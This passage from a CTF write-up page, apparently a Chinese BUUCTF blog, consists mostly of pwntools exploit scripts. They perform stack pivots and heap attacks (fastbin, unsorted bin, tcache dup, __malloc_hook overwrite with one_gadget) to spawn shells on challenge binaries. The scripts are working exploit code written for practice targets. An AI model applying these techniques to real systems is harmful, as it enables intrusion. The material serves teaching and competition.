class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;fl0ppy_codegate_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def choose(idx):</span><br><span class="line">	sh.sendlineafter(&quot;5. Exit&quot;,&quot;1&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;Which floppy do you want to use? 1 or 2?&quot;,str(idx))</span><br><span class="line">def write(content1,content2):</span><br><span class="line">	sh.sendlineafter(&quot;&gt;&quot;,&quot;2&quot;)</span><br><span class="line">	sh.sendafter(&quot;:&quot;,content1)</span><br><span class="line">	sh.sendafter(&quot;:&quot;,content2)</span><br><span class="line">def read():</span><br><span class="line">	sh.sendlineafter(&quot;&gt;&quot;,&quot;3&quot;)</span><br><span class="line">def modify(mode,content):</span><br><span class="line">	sh.sendlineafter(&quot;&gt;&quot;,&quot;4&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;Which one do you want to modify? 1 Description | 2 Data&quot;,str(mode))</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;fl0ppy_codegate_2016&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.27.so&quot;)</span><br><span class="line">        choose(2)</span><br><span class="line">        write(&#39;a&#39;,&#39;a&#39; * 0xa)</span><br><span class="line">        modify(1,&#39;a&#39; * 0xa)</span><br><span class="line">        choose(1)</span><br><span class="line">        write(&quot;\x11&quot;,&quot;\x12&quot;)</span><br><span class="line">        modify(1,&#39;\x12&#39; * 0x20)</span><br><span class="line">        choose(1)</span><br><span class="line">        read()</span><br><span class="line">        sh.recvuntil(&quot;\x12&quot; * 16)</span><br><span class="line">        ebp &#x3D; u32(sh.recv(4)) + 8</span><br><span class="line">        sh.recvuntil(&quot;\x12&quot; * 12)</span><br><span class="line">        libc &#x3D; u32(sh.recv(4))- 241 - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">        system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">        binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">        payload &#x3D; &#39;&#39;</span><br><span class="line">        payload &#x3D; p32(system) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">        payload &#x3D; payload.ljust(20,&#39;a&#39;)</span><br><span class="line">        payload +&#x3D; p32(ebp + 4)</span><br><span class="line">        payload &#x3D; payload.ljust(37,&#39;a&#39;)</span><br><span class="line">        modify(1,payload)</span><br><span class="line">        log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">        log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">        log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">        log.success(&quot;ebp: &quot; + hex(ebp))</span><br><span class="line">        if(debug &#x3D;&#x3D; 1):</span><br><span class="line">            log.success(&quot;pid: &quot; + str(sh.pid))</span><br><span class="line">        sh.sendline(&quot;5&quot;)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pwn(&quot;node3.buuoj.cn&quot;,28869,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x58-nsctf-online-2019-pwn1">0x58 nsctf_online_2019_pwn1</h2>
<h3 id="覆盖-malloc-hook为one-gadget">覆盖__malloc_hook为one_gadget</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;pwn2&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&quot;5.exit&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Input the size:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;Input the content:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;5.exit&quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Input the index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">	sh.recvuntil(&quot;5.exit&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Input the index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(&quot;Input size:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;Input new content:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(&quot;5.exit&quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;pwn2&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">		main_arena_offset &#x3D; lib.symbols[&#39;__malloc_hook&#39;] + 0x10</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">		main_arena_offset &#x3D; lib.symbols[&#39;__malloc_hook&#39;] + 0x10</span><br><span class="line">	payload &#x3D; p64(0xfbad1880)+p64(0x0)*3+&#39;\x00&#39;</span><br><span class="line">	edit(-16,0x28,payload)</span><br><span class="line">	sh.recvuntil(24*&#39;\x00&#39;)</span><br><span class="line">	libc &#x3D; u64(sh.recv(8)) - lib.symbols[&#39;_IO_file_jumps&#39;]</span><br><span class="line">	log.success(&quot;libc_base -&gt; &quot;+hex(libc))</span><br><span class="line">	main_arena &#x3D; libc + main_arena_offset</span><br><span class="line">	one_gadget &#x3D; libc + 0xf1147</span><br><span class="line">	log.success(&quot;main_arena: &quot; + hex(main_arena))</span><br><span class="line">	add(0xF8,&quot;\x11&quot; * 0xE8)</span><br><span class="line">	add(0x68,&quot;\x22&quot; * 0x58)</span><br><span class="line">	add(0x18,&quot;\x33&quot; * 0x8)</span><br><span class="line">	add(0xF8,&quot;\x44&quot; * 0xE8)</span><br><span class="line">	add(0x18,&quot;\x55&quot; * 0x10)</span><br><span class="line">	free(0)</span><br><span class="line">	edit(2,0x18,&#39;\x00&#39; * 0x10 + p64(0x190))</span><br><span class="line">	free(3)</span><br><span class="line">	payload  &#x3D; &quot;a&quot;*0xF0 + p64(0) + p64(0x71)</span><br><span class="line">	payload +&#x3D; &#39;\x66&#39; * (0x68 - 0x8)</span><br><span class="line">	payload +&#x3D; p64(0) + p64(0x21)</span><br><span class="line">	payload +&#x3D; &#39;\x77&#39; * 0x18</span><br><span class="line">	add(0x270,&quot;a&quot;*0x100)</span><br><span class="line">	edit(0,len(payload),payload)</span><br><span class="line">	free(1)</span><br><span class="line">	payload  &#x3D; &quot;a&quot;*0xF0 + p64(0) + p64(0x71)</span><br><span class="line">	payload +&#x3D; p64(main_arena - 0x1b-8) + p64(main_arena -0x1b-8)</span><br><span class="line">	edit(0,len(payload),payload)</span><br><span class="line">	add(0x60,&quot;aaaaaaaaa&quot;)</span><br><span class="line">	add(0x60,&quot;\x00&quot; * 3 + p64(one_gadget))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node2.buuoj.cn.wetolink.com&quot;,28275,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x59-nsctf-online-2019-pwn2">0x59 nsctf_online_2019_pwn2</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;pwn1&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(size):</span><br><span class="line">	sh.recvuntil(&quot;6.exit&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Input the size&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">def free():</span><br><span class="line">	sh.recvuntil(&quot;6.exit&quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">def show():</span><br><span class="line">	sh.recvuntil(&quot;6.exit&quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">def edit(content):</span><br><span class="line">	sh.recvuntil(&quot;6.exit&quot;)</span><br><span class="line">	sh.sendline(&quot;5&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Input the note&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def editName(name):</span><br><span class="line">	sh.recvuntil(&quot;6.exit&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input your name&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">def init(name):</span><br><span class="line">	sh.recvuntil(&quot;Please input your name&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;pwn1&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">	init(&quot;a&quot;*0x30)</span><br><span class="line">	add(0x80)</span><br><span class="line">	add(0x18)</span><br><span class="line">	editName(&quot;a&quot;*0x30 + &quot;\x10&quot;)</span><br><span class="line">	free()</span><br><span class="line">	add(0x18)</span><br><span class="line">	editName(&quot;a&quot;*0x30 + &quot;\x30&quot;)</span><br><span class="line">	show()</span><br><span class="line">	sh.recvuntil(&quot;\n&quot;)</span><br><span class="line">	main_arena &#x3D; u64(sh.recvuntil(&quot;\n&quot;,True).ljust(8,&quot;\x00&quot;)) - 88 </span><br><span class="line">	libc &#x3D; main_arena - 0x10 - lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	unsorted_bin_attack_addr &#x3D; libc + 0x3C6768</span><br><span class="line">	fastbin_attack_addr &#x3D; unsorted_bin_attack_addr + 0x18 - 0x1b + 0x10</span><br><span class="line">	add(0x10)</span><br><span class="line">	free()</span><br><span class="line">	add(0x68)</span><br><span class="line">	free()</span><br><span class="line">	add(0x30)</span><br><span class="line">	free()</span><br><span class="line">	add(0x90)</span><br><span class="line">	add(0x20)</span><br><span class="line">	editName(&quot;a&quot; * 0x30 + &quot;\x30&quot;)</span><br><span class="line">	free()</span><br><span class="line">	add(0x50)</span><br><span class="line">	editName(&quot;a&quot; * 0x30 + &quot;\x90&quot;)</span><br><span class="line">	edit(&#39;a&#39; * 8 + p64(unsorted_bin_attack_addr))</span><br><span class="line">	add(0x30)</span><br><span class="line">	add(0x68)</span><br><span class="line">	add(0x10)	</span><br><span class="line">	editName(&quot;a&quot; * 0x30 + &quot;\xc0&quot;)</span><br><span class="line">	free()</span><br><span class="line">	add(0x40)</span><br><span class="line">	editName(&quot;a&quot; * 0x30 + &quot;\xc0&quot;)</span><br><span class="line">	edit(p64(fastbin_attack_addr))</span><br><span class="line">	add(0x68)</span><br><span class="line">	add(0x68)</span><br><span class="line">	payload &#x3D; &quot;sh\x00&quot;</span><br><span class="line">	payload &#x3D; payload.ljust(0x30 - 5 - 8,&quot;\x00&quot;)</span><br><span class="line">	edit(payload + p64(system))</span><br><span class="line">	free()</span><br><span class="line">	log.success(&quot;fastbin_attack_addr: &quot; + hex(fastbin_attack_addr))</span><br><span class="line">	log.success(&quot;unsorted_bin_attack_addr: &quot; + hex(unsorted_bin_attack_addr))</span><br><span class="line">	log.success(&quot;main_arena: &quot; + hex(main_arena))</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node2.buuoj.cn.wetolink.com&quot;,28672,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x60-ciscn-2019-sw-5">0x60 ciscn_2019_sw_5</h2>
<h3 id="Ubuntu-18-04">Ubuntu 18.04</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_sw_5&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(title,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;title:&quot;)</span><br><span class="line">	sh.send(title)</span><br><span class="line">	sh.recvuntil(&quot;content:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_sw_5&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)		</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;libc-2.27.so&quot;)</span><br><span class="line">	chunk_offset &#x3D; 0x202040</span><br><span class="line">	add(&#39;\x11&#39; * 8,&#39;\x12&#39; * 0x68)</span><br><span class="line">	add(&#39;\x21&#39; * 8,&#39;\x22&#39; * 0x68)</span><br><span class="line">	free(0)</span><br><span class="line">	free(0)</span><br><span class="line">	add(&#39;\x80&#39;,&#39;\n&#39;)</span><br><span class="line">	heap_base &#x3D; u64(sh.recvuntil(&quot;\x20\n&quot;,True)[-6:].ljust(8,&quot;\x00&quot;)) - 0x280</span><br><span class="line">	add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">	add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">	payload  &#x3D; (&#39;\xf9&#39; * 0x8) * 6</span><br><span class="line">	payload +&#x3D; p64(0x250 - 0x50 + 1) + p64(0) * 4 + p64(heap_base + 0x60)</span><br><span class="line">	add(&#39;\xaa&#39; * 0x8,payload)</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">	add(p64(0),payload)</span><br><span class="line">	free(6)</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">	add(&#39;\n&#39;,payload)</span><br><span class="line">	libc &#x3D; u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) + 0x30 - lib.symbols[&#39;__malloc_hook&#39;] - 0xa</span><br><span class="line">	__malloc_hook &#x3D; libc + lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(__malloc_hook)</span><br><span class="line">	add(p64(0),payload)</span><br><span class="line">	one_gadget &#x3D; [0x4f2c5,0x4f322,0x10a38c]</span><br><span class="line">	add(p64(libc + one_gadget[1]),&#39;\n&#39;)</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))</span><br><span class="line">	log.success(&quot;heap_base: &quot; + hex(heap_base))</span><br><span class="line">	if debug &#x3D;&#x3D; 1:</span><br><span class="line">		log.success(&quot;pid &#x3D; &quot; + str(sh.pid))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node2.buuoj.cn.wetolink.com&quot;,28938,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x61-ciscn-nw-2">0x61 ciscn_nw_2</h2>
<h3 id="Ubuntu-18-04-2">Ubuntu 18.04</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_nw_2&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(title,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;title:&quot;)</span><br><span class="line">	sh.send(title)</span><br><span class="line">	sh.recvuntil(&quot;content:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_nw_2&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)		</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;libc-2.27.so&quot;)</span><br><span class="line">	chunk_offset &#x3D; 0x202040</span><br><span class="line">	add(&#39;\x11&#39; * 8,&#39;\x12&#39; * 0x68)</span><br><span class="line">	add(&#39;\x21&#39; * 8,&#39;\x22&#39; * 0x68)</span><br><span class="line">	free(0)</span><br><span class="line">	free(0)</span><br><span class="line">	add(&#39;\x80&#39;,&#39;\n&#39;)</span><br><span class="line">	heap_base &#x3D; u64(sh.recvuntil(&quot;\x20\n&quot;,True)[-6:].ljust(8,&quot;\x00&quot;)) - 0x280</span><br><span class="line">	add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">	add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">	payload  &#x3D; (&#39;\xf9&#39; * 0x8) * 6</span><br><span class="line">	payload +&#x3D; p64(0x250 - 0x50 + 1) + p64(0) * 4 + p64(heap_base + 0x60)</span><br><span class="line">	add(&#39;\xaa&#39; * 0x8,payload)</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">	add(p64(0),payload)</span><br><span class="line">	free(6)</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">	add(&#39;\n&#39;,payload)</span><br><span class="line">	libc &#x3D; u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) + 0x30 - lib.symbols[&#39;__malloc_hook&#39;] - 0xa</span><br><span class="line">	__malloc_hook &#x3D; libc + lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(__malloc_hook)</span><br><span class="line">	add(p64(0),payload)</span><br><span class="line">	one_gadget &#x3D; [0x4f2c5,0x4f322,0x10a38c]</span><br><span class="line">	add(p64(libc + one_gadget[1]),&#39;\n&#39;)</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	if debug &#x3D;&#x3D; 1:</span><br><span class="line">		log.success(&quot;pid &#x3D; &quot; + str(sh.pid))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node2.buuoj.cn.wetolink.com&quot;,28979,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x62-ciscn-2019-en-1">0x62 ciscn_2019_en_1</h2>
<h3 id="标准的arm-pwn-rop，很适合新手">标准的arm pwn rop，很适合新手</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 